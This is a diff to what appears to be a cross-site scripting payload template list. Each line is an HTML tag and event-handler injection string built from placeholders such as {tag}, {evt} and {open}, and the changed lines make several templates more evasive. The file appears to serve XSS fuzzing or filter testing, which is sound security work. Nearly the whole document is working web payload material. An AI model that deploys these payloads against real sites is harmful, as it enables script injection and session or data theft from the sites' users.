@@ -24,7 +24,7 @@
 {open} {evt}<{tag} ={open} {evt}="javascript:alert(1)">
 {open}<{tag} = {evt}"alert('Example')">
 <{tag}  {evt}={open} {evt}("1")>
- {evt}{open}<{tag} alert('Vulnerable')
+ {evt}{open}<{tag} {evt}=alert('Vulnerable')
 {open}<{tag} = {evt}"{open} {evt}=prompt(1)">
 {open}<{tag} alert('Injected')={open} {evt}=_=confirm`1`
 <{tag}  {evt}="javascript:{open} {evt}(1);">
@@ -43,14 +43,14 @@
 <{tag}  {evt}={open} {evt}alert('Dynamic')>
 {open} {evt}={open}<{tag} alert(1)>
 <{tag}  {evt}="{open}alert(1)={open}">
- {evt}{open}{open}<{tag} alert('Event')>
+{open}{open}{evt}{open}{open}<{tag} alert('Event')>
 {open} {evt}<{tag} {open}alert('Double')
 {open}<{tag} ="javascript:{open} {evt}(1);">
 {open} {evt}{open}<{tag} alert(' {evt}')>
 <{tag}   {evt}={open}"alert('Extra')">
 {open} {evt}<{tag} = {evt}"alert('{open}')">
 {open}<{tag}  {evt}="javascript:{open} {evt}(1)">
- {evt}={open}<{tag} {open}alert(' {evt}')>
+{open}{open}{evt}={open}<{tag} {open}alert(' {evt}')>
 {open}<{tag}  {evt}="{open} {evt}(1)">
 {open}<{tag}  {evt}={open}"{pay}alert(' {evt}')">
 <{tag}  {evt}="{open} {evt}(1)">
@@ -64,10 +64,10 @@
 {open} {evt}<{tag} alert('Injection')
  {evt}{open}{open}<{tag} alert('Dynamic')
 {open}<{tag}  {evt}= {evt}"alert(' {evt}')">
-<{tag}  {evt}=" {evt}{open}alert(1)">
+<{tag}  {evt}=" {evt}{open}alert(1)">{open}{open}
 {open}<{tag}  {evt}=" {evt}"{open}alert(1)">
 {open} {evt}{open}<{tag} javascript: {evt}(1);
-<{tag}  {evt}={open}" {evt}"{open}alert(1)">
+<{tag}  {evt}={open}" {evt}=prompt(//) "{open}alert(1)">
  {evt}={open}<{tag}  {evt}="alert(' {evt}')">
 {open}<{tag}  {evt}= {evt}alert('{open}')>
 {open} {evt}<{tag} " {evt}{open}alert(1)">
@@ -84,7 +84,7 @@
 {open}<{tag}  {evt}=alert(' {evt}')= {evt}alert('{open}')
 <{tag}  {evt}="prompt(/ {evt}/){open}alert(' {evt}')={open}"
 {open}<{tag} {evt}="alert(1)">{pay}
-<{tag} {evt} {open}{open}<{tag} {evt}="alert(1)">{pay}{open}{tag}
+{open}{open}<{tag} {evt} {open}{open}<{tag} {evt}="alert(1)">{pay}{open}{tag}{open}{open}{open}
 {open}{evt}<{tag} {evt}="alert(1)">{pay}
 <{tag} {evt}="{open}alert(1)">{pay}>
 >><{tag}><{tag}></{tag}><{tag}>{open}{open}{open}<{tag}  {evt}="javascript:alert(1)">{pay}
@@ -167,4 +167,4 @@
 {open}<{tag} " {evt}={open}alert(' {evt}')">{pay}
  {evt}={open}<{tag}  {evt}=" {evt}"{open}alert(1)>{pay}
 {open}<{tag}  {evt}=alert(' {evt}')= {evt}alert('{open}')>{pay}
-<{tag}  {evt}="prompt(/ {evt}/){open}alert(' {evt}')={open}">{pay}
+<{tag}  {evt}="prompt(/	{evt}/);{open}alert(' {evt}')={open}">{pay}
